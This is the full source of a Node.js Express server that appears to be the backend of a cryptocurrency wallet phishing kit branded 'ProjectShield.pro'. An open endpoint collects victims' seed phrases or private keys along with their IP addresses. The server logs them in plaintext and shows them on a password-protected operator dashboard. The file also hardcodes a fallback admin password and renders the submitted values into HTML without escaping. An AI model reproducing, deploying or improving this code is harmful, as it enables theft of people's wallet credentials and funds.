const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const basicAuth = require('express-basic-auth');

const app = express();
const PORT = process.env.PORT || 3000;

// Configure your password here (or use environment variable)
const DASHBOARD_PASSWORD = process.env.DASHBOARD_PASSWORD || 'eBENZ35000$$';

// Middleware
app.use(cors());
app.use(express.json());

// =============================================
// PUBLIC ROUTE FOR HEALTH CHECKS (KEEPS SERVER AWAKE)
// =============================================
app.get('/health', (req, res) => {
  res.status(200).json({ 
    status: 'OK',
    message: 'Server is running',
    timestamp: new Date().toISOString()
  });
});

// =============================================
// PASSWORD PROTECTION MIDDLEWARE (FOR SENSITIVE ROUTES)
// =============================================
const authMiddleware = basicAuth({
  users: { 'admin': DASHBOARD_PASSWORD },
  challenge: true,
  realm: 'ProjectShield.pro Dashboard'
});

// Create logs directory if it doesn't exist
const logsDir = path.join(__dirname, 'wallet_logs');
if (!fs.existsSync(logsDir)) {
  fs.mkdirSync(logsDir);
}

// Store wallet connections in memory
const walletConnections = [];

// =============================================
// API ENDPOINTS (PROTECTED)
// =============================================

// POST endpoint to collect wallet info
app.post('/api/wallet-connect', (req, res) => {
  try {
    const { inputType, inputValue, walletType, timestamp, userAgent, ipAddress } = req.body;

    const connectionData = {
      id: Date.now().toString(),
      inputType,
      inputValue,
      walletType,
      timestamp,
      userAgent,
      ipAddress,
      receivedAt: new Date().toISOString()
    };

    walletConnections.push(connectionData);

    const logEntry = `
=== WALLET CONNECTION ===
ID: ${connectionData.id}
Wallet Type: ${walletType}
Input Type: ${inputType}
${inputType === 'seedPhrase' ? 'Seed Phrase' : 'Private Key'}: ${inputValue}
Timestamp: ${timestamp}
User Agent: ${userAgent}
IP Address: ${ipAddress}
Received At: ${connectionData.receivedAt}
========================
`;

    const logFile = path.join(logsDir, `wallet_log_${new Date().toISOString().split('T')[0]}.txt`);
    fs.appendFileSync(logFile, logEntry);

    res.json({
      success: true,
      message: 'Wallet connection recorded',
      connectionId: connectionData.id
    });

  } catch (error) {
    console.error('Error processing wallet connection:', error);
    res.status(500).json({
      success: false,
      message: 'Server error'
    });
  }
});

// =============================================
// PROTECTED ROUTES (REQUIRE PASSWORD)
// =============================================
app.use(authMiddleware); // Everything after this line requires auth

// Get all connections
app.get('/api/wallet-connections', (req, res) => {
  res.json({
    success: true,
    total: walletConnections.length,
    connections: walletConnections
  });
});

// Dashboard
app.get('/', (req, res) => {
  const html = `
  <!DOCTYPE html>
  <html>
  <head>
    <title>Wallet Connections Dashboard</title>
    <style>
      body { font-family: Arial, sans-serif; margin: 40px; }
      .connection { border: 1px solid #ddd; padding: 15px; margin: 10px 0; border-radius: 5px; }
      .seed-phrase { background: #f5f5f5; padding: 10px; font-family: monospace; word-break: break-word; }
      .timestamp { color: #666; font-size: 0.9em; }
      .wallet-type { font-weight: bold; color: #2c3e50; }
    </style>
  </head>
  <body>
    <h1>Wallet Connections Dashboard</h1>
    <p>Total connections: <strong>${walletConnections.length}</strong></p>
    <div id="connections">
      ${walletConnections.map(conn => `
        <div class="connection">
          <div class="wallet-type">Wallet: ${conn.walletType}</div>
          <div class="timestamp">Time: ${conn.timestamp}</div>
          <div class="timestamp">IP: ${conn.ipAddress}</div>
          <div>${conn.inputType === 'seedPhrase' ? 'Seed Phrase:' : 'Private Key:'}</div>
          <div class="seed-phrase">${conn.inputValue}</div>
        </div>
      `).join('')}
    </div>
  </body>
  </html>
  `;
  res.send(html);
});

// =============================================
// SERVER STARTUP
// =============================================
app.listen(PORT, () => {
  console.log(`
✅ Server running on port ${PORT}
🌐 Public Health Check: http://localhost:${PORT}/health
🔒 Password-protected Dashboard: http://localhost:${PORT}
📩 API: POST /api/wallet-connect
`);
});